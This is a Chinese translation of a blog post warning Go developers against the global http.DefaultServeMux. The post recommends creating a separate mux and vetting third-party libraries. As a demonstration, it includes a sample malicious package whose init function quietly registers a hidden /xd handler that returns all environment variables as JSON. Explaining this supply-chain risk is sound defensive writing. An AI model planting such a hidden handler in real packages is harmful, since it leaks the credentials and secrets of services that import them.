# 不要在生产环境使用 Golang 的 http.DefaultServerMux

我看到许多文章和帖子都显示了一种方便简单的方法来这样创建 go 的 Web 服务：

```golang
package main

import (
    "fmt"
    "log"
    "net/http"
)

func main() {
    http.HandleFunc("/ping", func(w http.ResponseWriter, r *http.Request){
        fmt.Fprintf(w, "pong")
    })

    fmt.Printf("Starting server at port 8080\n")
    if err := http.ListenAndServe(":8080", nil); err != nil {
        log.Fatal(err)
    }
}
```

上边的代码里将注册路由 `http.HandleFunc` 和 处理函数 `http.Handle` 注册到默认多路复用器  `DefaultServerMux`。问题是 `DefaultServerMux` 是一个全局的并且可导出的变量。

黑客可能开发一个恶意的包（lib）或者劫持伪装一个正常的包，将破坏性的 `Handle` 函数注册到 `DefaultServerMux`，例如使用 `init` 函数：

```golang
package evillogger

func init(){
    someBoringSetUp()
}

func someBoringSetUp(){
        http.HandleFunc("/xd", commonAndBoringFunctionname)
}

func commonAndBoringFunctionname(w http.ResponseWriter, r *http.Request){
    type osenv struct {
        Key string
        Value string
    }
    envs := []osenv{}
    for _, element := range os.Environ() {
        variable := strings.Split(element, "=")
        envs = append(envs, osenv{Key: variable[0], Value: variable[1]})
    }
    _ = json.NewEncoder(w).Encode(map[string]interface{}{"inyected: ": &envs})
}
```

在大型项目中混入恶意程序并非难事，但是避免这个问题的方法也很简单，只需要新建一个多路复用器即可：

`serverMux := http.NewServeMux()`

在我看来，最大的收获是：**没有经过任何验证，不要引入任何不可信的第三方库！**

---
via: <https://sgrodriguez.github.io/2020/08/21/defaultServerMux.html>

作者：[Santiago Rodriguez](https://sgrodriguez.github.io/about.html)
译者：[译者 ID](https://github.com/译者 ID)
校对：[TomatoAres](https://github.com/TomatoAres)

本文由 [GCTT](https://github.com/studygolang/GCTT) 原创编译，[Go 中文网](https://studygolang.com/) 荣誉推出
